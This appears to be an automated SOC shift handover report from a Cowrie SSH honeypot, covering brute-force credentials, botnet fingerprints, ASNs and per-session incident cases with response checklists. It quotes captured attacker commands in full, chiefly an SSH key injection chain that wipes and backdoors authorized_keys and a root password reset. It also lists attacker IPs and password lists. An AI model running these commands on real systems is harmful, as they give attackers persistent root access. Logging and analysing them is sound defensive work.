# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-11 |
| **Generated At** | 2026-06-11T20:27:47Z |
| **Shift Time** | 20:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **350** |
| Confirmed Threats | **337** |
| False Positives Filtered | **13** (3.7%) |
| Unique Attacker IPs | **50** |
| Countries of Origin | **16** |
| High Severity Cases | **83** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **267** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **244** |
| Unique Credential Pairs | **155** |
| Unique Usernames | **105** |
| Unique Passwords | **138** |
| Successful Auth Pairs | **55** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `345gs5662d34` | 39 |
| `admin` | 6 |
| `sammy` | 3 |
| `supervisor` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 40 |
| `345gs5662d34` | 39 |
| `123456` | 11 |
| `1234` | 5 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 40 |
| `345gs5662d34` | `345gs5662d34` | 39 |
| `vu` | `vu` | 2 |
| `admin` | `Password123!` | 2 |
| `jitendra` | `jitendra@123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abc123456#` | `106.240.29.98` | 2026-06-11T16:09:08 |
| `root` | `3245gs5662d34` | `106.240.29.98` | 2026-06-11T16:09:12 |
| `root` | `qapmoc` | `155.4.245.222` | 2026-06-11T17:37:58 |
| `root` | `3245gs5662d34` | `155.4.245.222` | 2026-06-11T17:38:04 |
| `root` | `secret123` | `103.153.190.105` | 2026-06-11T17:43:58 |
| `root` | `3245gs5662d34` | `103.153.190.105` | 2026-06-11T17:44:02 |
| `root` | `aA.123456` | `165.154.1.18` | 2026-06-11T17:51:39 |
| `root` | `3245gs5662d34` | `165.154.1.18` | 2026-06-11T17:51:42 |
| `root` | `letmein1!` | `165.154.1.18` | 2026-06-11T17:53:44 |
| `root` | `123123aA` | `115.190.211.57` | 2026-06-11T18:16:26 |
| `root` | `3245gs5662d34` | `115.190.211.57` | 2026-06-11T18:16:37 |
| `root` | `asdf1234!` | `69.74.29.21` | 2026-06-11T18:35:31 |
| `root` | `3245gs5662d34` | `69.74.29.21` | 2026-06-11T18:35:37 |
| `root` | `qQ147258..` | `69.74.29.21` | 2026-06-11T18:43:02 |
| `root` | `keypos` | `69.74.29.21` | 2026-06-11T18:45:01 |
| `root` | `temp1234` | `69.74.29.21` | 2026-06-11T18:47:06 |
| `root` | `genie` | `69.74.29.21` | 2026-06-11T18:56:48 |
| `root` | `alex123` | `69.74.29.21` | 2026-06-11T19:00:58 |
| `root` | `sunbeam` | `69.74.29.21` | 2026-06-11T19:10:44 |
| `root` | `root123!@#` | `119.96.159.237` | 2026-06-11T19:11:36 |
| `root` | `$#@!ergean*(` | `69.74.29.21` | 2026-06-11T19:12:45 |
| `root` | `Mr123456` | `69.74.29.21` | 2026-06-11T19:14:45 |
| `root` | `panzer` | `190.223.60.209` | 2026-06-11T19:15:35 |
| `root` | `3245gs5662d34` | `190.223.60.209` | 2026-06-11T19:15:44 |
| `root` | `66666` | `14.29.170.54` | 2026-06-11T19:22:21 |
| `root` | `3245gs5662d34` | `14.29.170.54` | 2026-06-11T19:22:25 |
| `root` | `123zxcvbnm` | `69.74.29.21` | 2026-06-11T19:22:28 |
| `root` | `Design@123` | `69.74.29.21` | 2026-06-11T19:24:29 |
| `root` | `112233` | `154.146.238.122` | 2026-06-11T19:37:18 |
| `root` | `1w2q3r4e` | `183.36.126.68` | 2026-06-11T19:39:20 |
| `root` | `3245gs5662d34` | `183.36.126.68` | 2026-06-11T19:39:35 |
| `root` | `ROOT` | `170.80.65.140` | 2026-06-11T19:44:38 |
| `root` | `3245gs5662d34` | `170.80.65.140` | 2026-06-11T19:44:46 |
| `root` | `nexus@123` | `183.36.126.68` | 2026-06-11T19:45:10 |
| `root` | `ASDzxc.123` | `183.36.126.68` | 2026-06-11T19:46:25 |
| `root` | `Qwerty_1234` | `183.36.126.68` | 2026-06-11T19:46:44 |
| `root` | `masukaja` | `183.36.126.68` | 2026-06-11T19:47:29 |
| `root` | `Zxcvbnm0` | `183.36.126.68` | 2026-06-11T19:48:09 |
| `root` | `111888` | `170.80.65.140` | 2026-06-11T19:53:03 |
| `root` | `1QAZ@2wsx` | `170.80.65.140` | 2026-06-11T19:55:07 |
| `root` | `Superuser9!` | `170.80.65.140` | 2026-06-11T19:57:22 |
| `root` | `abc123..` | `170.80.65.140` | 2026-06-11T20:03:47 |
| `root` | `Huawei@123456` | `112.120.171.95` | 2026-06-11T20:07:46 |
| `root` | `3245gs5662d34` | `112.120.171.95` | 2026-06-11T20:07:50 |
| `root` | `1w2q3r4e` | `112.120.171.95` | 2026-06-11T20:09:47 |
| `root` | `tortuga` | `170.80.65.140` | 2026-06-11T20:10:02 |
| `root` | `Sachin@123` | `122.168.194.41` | 2026-06-11T20:10:20 |
| `root` | `3245gs5662d34` | `122.168.194.41` | 2026-06-11T20:10:23 |
| `root` | `root123456A` | `112.120.171.95` | 2026-06-11T20:11:41 |
| `root` | `hacker123` | `170.80.65.140` | 2026-06-11T20:14:20 |
| `root` | `Qwerty_1234` | `112.120.171.95` | 2026-06-11T20:15:31 |
| `root` | `ab1234` | `112.120.171.95` | 2026-06-11T20:18:19 |
| `root` | `masukaja` | `112.120.171.95` | 2026-06-11T20:22:05 |
| `root` | `Administrator_123` | `170.80.65.140` | 2026-06-11T20:22:58 |
| `root` | `AAA123456` | `170.80.65.140` | 2026-06-11T20:25:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **350** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 284 |
| OpenSSH | 8 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 183 | 16 |
| `03a80b21afa8...` | Modern SSH client | 58 | 4 |
| `af8223ac9914...` | libssh-based | 33 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 8 | 8 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 183 | 16 | Mirai/variant |
| `03a80b21afa8...` | libssh | 58 | 4 | Modern SSH client |
| `af8223ac9914...` | libssh | 33 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `acaa53e0a7d7...` | OpenSSH | 8 | 8 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 40 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:A3sCcFYMAqg9"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `183.36.126.68`, `119.96.159.237`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `115.190.211.57`, `155.4.245.222`, `103.153.190.105`, `14.29.170.54`, `190.223.60.209`, `112.120.171.95`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **50** |
| Unique ASNs | **35** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |
| `AS58563` | CHINANET Hubei province network | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS46562` | Performive LLC | 2 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (83)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d50b3de212d2

| Field | Detail |
|---|---|
| **Source IP** | `106.240.29[.]98` |
| **First Seen** | 2026-06-11 16:09 |
| **Last Seen** | 2026-06-11 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 16:09:08` | `cowrie.session.connect` |
| `2026-06-11 16:09:08` | `cowrie.client.version` |
| `2026-06-11 16:09:08` | `cowrie.client.kex` |
| `2026-06-11 16:09:08` | `cowrie.login.success` |
| `2026-06-11 16:09:09` | `cowrie.session.params` |
| `2026-06-11 16:09:09` | `cowrie.command.input` |
| `2026-06-11 16:09:09` | `cowrie.command.failed` |
| `2026-06-11 16:09:09` | `cowrie.log.closed` |
| `2026-06-11 16:09:09` | `cowrie.session.params` |
| `2026-06-11 16:09:09` | `cowrie.command.input` |
| `2026-06-11 16:09:09` | `cowrie.session.file_download` |
| `2026-06-11 16:09:09` | `cowrie.log.closed` |
| `2026-06-11 16:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.240.29[.]98` to AbuseIPDB if not already reported
- [ ] Block `106.240.29[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d6bead4b8ed

| Field | Detail |
|---|---|
| **Source IP** | `106.240.29[.]98` |
| **First Seen** | 2026-06-11 16:09 |
| **Last Seen** | 2026-06-11 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 16:09:11` | `cowrie.session.connect` |
| `2026-06-11 16:09:11` | `cowrie.client.version` |
| `2026-06-11 16:09:12` | `cowrie.client.kex` |
| `2026-06-11 16:09:12` | `cowrie.login.success` |
| `2026-06-11 16:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.240.29[.]98` to AbuseIPDB if not already reported
- [ ] Block `106.240.29[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d93b9ed342

| Field | Detail |
|---|---|
| **Source IP** | `155.4.245[.]222` |
| **First Seen** | 2026-06-11 17:37 |
| **Last Seen** | 2026-06-11 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:37:57` | `cowrie.session.connect` |
| `2026-06-11 17:37:57` | `cowrie.client.version` |
| `2026-06-11 17:37:57` | `cowrie.client.kex` |
| `2026-06-11 17:37:58` | `cowrie.login.success` |
| `2026-06-11 17:37:59` | `cowrie.session.params` |
| `2026-06-11 17:37:59` | `cowrie.command.input` |
| `2026-06-11 17:37:59` | `cowrie.command.failed` |
| `2026-06-11 17:38:00` | `cowrie.log.closed` |
| `2026-06-11 17:38:00` | `cowrie.session.params` |
| `2026-06-11 17:38:00` | `cowrie.command.input` |
| `2026-06-11 17:38:00` | `cowrie.session.file_download` |
| `2026-06-11 17:38:00` | `cowrie.log.closed` |
| `2026-06-11 17:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.245[.]222` to AbuseIPDB if not already reported
- [ ] Block `155.4.245[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adb84f98f0f1

| Field | Detail |
|---|---|
| **Source IP** | `155.4.245[.]222` |
| **First Seen** | 2026-06-11 17:38 |
| **Last Seen** | 2026-06-11 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:38:03` | `cowrie.session.connect` |
| `2026-06-11 17:38:03` | `cowrie.client.version` |
| `2026-06-11 17:38:03` | `cowrie.client.kex` |
| `2026-06-11 17:38:04` | `cowrie.login.success` |
| `2026-06-11 17:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.245[.]222` to AbuseIPDB if not already reported
- [ ] Block `155.4.245[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1f7c481868

| Field | Detail |
|---|---|
| **Source IP** | `103.153.190[.]105` |
| **First Seen** | 2026-06-11 17:43 |
| **Last Seen** | 2026-06-11 17:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:43:58` | `cowrie.session.connect` |
| `2026-06-11 17:43:58` | `cowrie.client.version` |
| `2026-06-11 17:43:58` | `cowrie.client.kex` |
| `2026-06-11 17:43:58` | `cowrie.login.success` |
| `2026-06-11 17:43:59` | `cowrie.session.params` |
| `2026-06-11 17:43:59` | `cowrie.command.input` |
| `2026-06-11 17:43:59` | `cowrie.command.failed` |
| `2026-06-11 17:43:59` | `cowrie.log.closed` |
| `2026-06-11 17:43:59` | `cowrie.session.params` |
| `2026-06-11 17:43:59` | `cowrie.command.input` |
| `2026-06-11 17:43:59` | `cowrie.session.file_download` |
| `2026-06-11 17:43:59` | `cowrie.log.closed` |
| `2026-06-11 17:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.153.190[.]105` to AbuseIPDB if not already reported
- [ ] Block `103.153.190[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d328b0ce5e96

| Field | Detail |
|---|---|
| **Source IP** | `103.153.190[.]105` |
| **First Seen** | 2026-06-11 17:44 |
| **Last Seen** | 2026-06-11 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:44:01` | `cowrie.session.connect` |
| `2026-06-11 17:44:01` | `cowrie.client.version` |
| `2026-06-11 17:44:01` | `cowrie.client.kex` |
| `2026-06-11 17:44:02` | `cowrie.login.success` |
| `2026-06-11 17:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.153.190[.]105` to AbuseIPDB if not already reported
- [ ] Block `103.153.190[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3067b21fb7c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-06-11 17:51 |
| **Last Seen** | 2026-06-11 17:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:51:39` | `cowrie.session.connect` |
| `2026-06-11 17:51:39` | `cowrie.client.version` |
| `2026-06-11 17:51:39` | `cowrie.client.kex` |
| `2026-06-11 17:51:39` | `cowrie.login.success` |
| `2026-06-11 17:51:40` | `cowrie.session.params` |
| `2026-06-11 17:51:40` | `cowrie.command.input` |
| `2026-06-11 17:51:40` | `cowrie.command.failed` |
| `2026-06-11 17:51:40` | `cowrie.log.closed` |
| `2026-06-11 17:51:40` | `cowrie.session.params` |
| `2026-06-11 17:51:40` | `cowrie.command.input` |
| `2026-06-11 17:51:40` | `cowrie.session.file_download` |
| `2026-06-11 17:51:40` | `cowrie.log.closed` |
| `2026-06-11 17:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d32e492ca03

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-06-11 17:51 |
| **Last Seen** | 2026-06-11 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:51:42` | `cowrie.session.connect` |
| `2026-06-11 17:51:42` | `cowrie.client.version` |
| `2026-06-11 17:51:42` | `cowrie.client.kex` |
| `2026-06-11 17:51:42` | `cowrie.login.success` |
| `2026-06-11 17:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-accfad981128

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-06-11 17:53 |
| **Last Seen** | 2026-06-11 17:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:53:43` | `cowrie.session.connect` |
| `2026-06-11 17:53:43` | `cowrie.client.version` |
| `2026-06-11 17:53:43` | `cowrie.client.kex` |
| `2026-06-11 17:53:44` | `cowrie.login.success` |
| `2026-06-11 17:53:44` | `cowrie.session.params` |
| `2026-06-11 17:53:44` | `cowrie.command.input` |
| `2026-06-11 17:53:44` | `cowrie.command.failed` |
| `2026-06-11 17:53:44` | `cowrie.log.closed` |
| `2026-06-11 17:53:44` | `cowrie.session.params` |
| `2026-06-11 17:53:44` | `cowrie.command.input` |
| `2026-06-11 17:53:45` | `cowrie.session.file_download` |
| `2026-06-11 17:53:45` | `cowrie.log.closed` |
| `2026-06-11 17:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00094727dcfd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-06-11 17:53 |
| **Last Seen** | 2026-06-11 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 17:53:46` | `cowrie.session.connect` |
| `2026-06-11 17:53:46` | `cowrie.client.version` |
| `2026-06-11 17:53:46` | `cowrie.client.kex` |
| `2026-06-11 17:53:47` | `cowrie.login.success` |
| `2026-06-11 17:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56d5cf3957d

| Field | Detail |
|---|---|
| **Source IP** | `115.190.211[.]57` |
| **First Seen** | 2026-06-11 18:16 |
| **Last Seen** | 2026-06-11 18:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
